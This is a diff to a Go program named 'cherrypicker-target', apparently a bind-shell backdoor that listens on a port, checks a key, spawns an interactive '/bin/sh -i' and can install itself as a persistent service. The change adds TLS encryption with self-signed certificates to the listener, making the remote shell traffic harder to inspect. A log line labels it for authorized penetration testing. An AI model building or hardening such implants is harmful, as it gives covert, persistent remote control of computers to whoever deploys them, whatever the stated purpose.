@@ -2,11 +2,17 @@ package main
 
 import (
 	"crypto/rand"
+	"crypto/rsa"
 	"crypto/sha256"
+	"crypto/tls"
+	"crypto/x509"
+	"crypto/x509/pkix"
 	"encoding/hex"
+	"encoding/pem"
 	"flag"
 	"fmt"
 	"log"
+	"math/big"
 	"net"
 	"os"
 	"os/exec"
@@ -34,11 +40,14 @@ func main() {
 	port := flag.Int("p", 0, "Port to listen on (required)")
 	key := flag.String("s", "", "Authentication signature/key (required)")
 	installPersistence := flag.Bool("install", false, "Install as persistent service/daemon")
+	useTLS := flag.Bool("tls", true, "Use TLS encryption (default: true)")
+	certFile := flag.String("cert", "", "Path to TLS certificate file (auto-generated if not provided)")
+	keyFile := flag.String("key", "", "Path to TLS private key file (auto-generated if not provided)")
 	flag.Parse()
 
 	// Validate required arguments
 	if *port == 0 {
-		log.Fatal("[!] Error: -p (port) is required\n\nUsage: ./cherrypicker-target -p <PORT> -s <SIGNATURE> [-install]\n")
+		log.Fatal("[!] Error: -p (port) is required\n\nUsage: ./cherrypicker-target -p <PORT> -s <SIGNATURE> [-install] [-tls] [-cert FILE] [-key FILE]\n")
 	}
 
 	if *port < 1 || *port > 65535 {
@@ -46,7 +55,7 @@ func main() {
 	}
 
 	if *key == "" {
-		log.Fatal("[!] Error: -s (signature) is required\n\nUsage: ./cherrypicker-target -p <PORT> -s <SIGNATURE> [-install]\n")
+		log.Fatal("[!] Error: -s (signature) is required\n\nUsage: ./cherrypicker-target -p <PORT> -s <SIGNATURE> [-install] [-tls] [-cert FILE] [-key FILE]\n")
 	}
 
 	if len(*key) < 10 {
@@ -69,11 +78,30 @@ func main() {
 	log.Println("[!] For authorized penetration testing only!")
 	log.Printf("[*] Listening on port %d\n", *port)
 	log.Printf("[*] Auth key configured: %d bytes\n", len(authKey))
+	if *useTLS {
+		log.Println("[*] TLS encryption: ENABLED")
+	} else {
+		log.Println("[!] WARNING: TLS encryption DISABLED - traffic will be unencrypted!")
+	}
 
-	// Start listener
-	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", *port))
-	if err != nil {
-		log.Fatalf("[!] Failed to start listener: %v\n", err)
+	// Start listener (TLS or plain)
+	var listener net.Listener
+	if *useTLS {
+		tlsConfig, err := setupTLS(*certFile, *keyFile)
+		if err != nil {
+			log.Fatalf("[!] Failed to setup TLS: %v\n", err)
+		}
+		listener, err = tls.Listen("tcp", fmt.Sprintf(":%d", *port), tlsConfig)
+		if err != nil {
+			log.Fatalf("[!] Failed to start TLS listener: %v\n", err)
+		}
+		log.Println("[+] TLS listener started successfully")
+	} else {
+		var err error
+		listener, err = net.Listen("tcp", fmt.Sprintf(":%d", *port))
+		if err != nil {
+			log.Fatalf("[!] Failed to start listener: %v\n", err)
+		}
 	}
 	defer listener.Close()
 
@@ -230,6 +258,86 @@ func getShell() (string, []string) {
 	default:
 		return "/bin/sh", []string{"-i"}
 	}
+}
+
+// setupTLS generates or loads TLS certificates
+func setupTLS(certFile, keyFile string) (*tls.Config, error) {
+	var cert tls.Certificate
+	var err error
+
+	// If cert and key files provided, load them
+	if certFile != "" && keyFile != "" {
+		cert, err = tls.LoadX509KeyPair(certFile, keyFile)
+		if err != nil {
+			return nil, fmt.Errorf("failed to load certificate: %w", err)
+		}
+		log.Println("[+] Loaded user-provided TLS certificate")
+	} else {
+		// Generate self-signed certificate
+		log.Println("[*] Generating self-signed TLS certificate...")
+		cert, err = generateSelfSignedCert()
+		if err != nil {
+			return nil, fmt.Errorf("failed to generate certificate: %w", err)
+		}
+		log.Println("[+] Self-signed certificate generated successfully")
+	}
+
+	return &tls.Config{
+		Certificates: []tls.Certificate{cert},
+		MinVersion:   tls.VersionTLS12,
+		CipherSuites: []uint16{
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+		},
+	}, nil
+}
+
+// generateSelfSignedCert creates an ephemeral self-signed certificate
+func generateSelfSignedCert() (tls.Certificate, error) {
+	// Generate RSA key
+	priv, err := rsa.GenerateKey(rand.Reader, 2048)
+	if err != nil {
+		return tls.Certificate{}, err
+	}
+
+	// Create certificate template
+	notBefore := time.Now()
+	notAfter := notBefore.Add(365 * 24 * time.Hour) // Valid for 1 year
+
+	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
+	if err != nil {
+		return tls.Certificate{}, err
+	}
+
+	template := x509.Certificate{
+		SerialNumber: serialNumber,
+		Subject: pkix.Name{
+			Organization: []string{"CherryPicker"},
+			CommonName:   "localhost",
+		},
+		NotBefore:             notBefore,
+		NotAfter:              notAfter,
+		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
+		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+		BasicConstraintsValid: true,
+		DNSNames:              []string{"localhost"},
+		IPAddresses:           []net.IP{net.ParseIP("127.0.0.1"), net.ParseIP("::1")},
+	}
+
+	// Create certificate
+	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
+	if err != nil {
+		return tls.Certificate{}, err
+	}
+
+	// Encode certificate and key to PEM
+	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
+	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
+
+	// Load certificate
+	return tls.X509KeyPair(certPEM, keyPEM)
 }
 
 // installAsPersistentService installs the binary as a persistent service/daemon
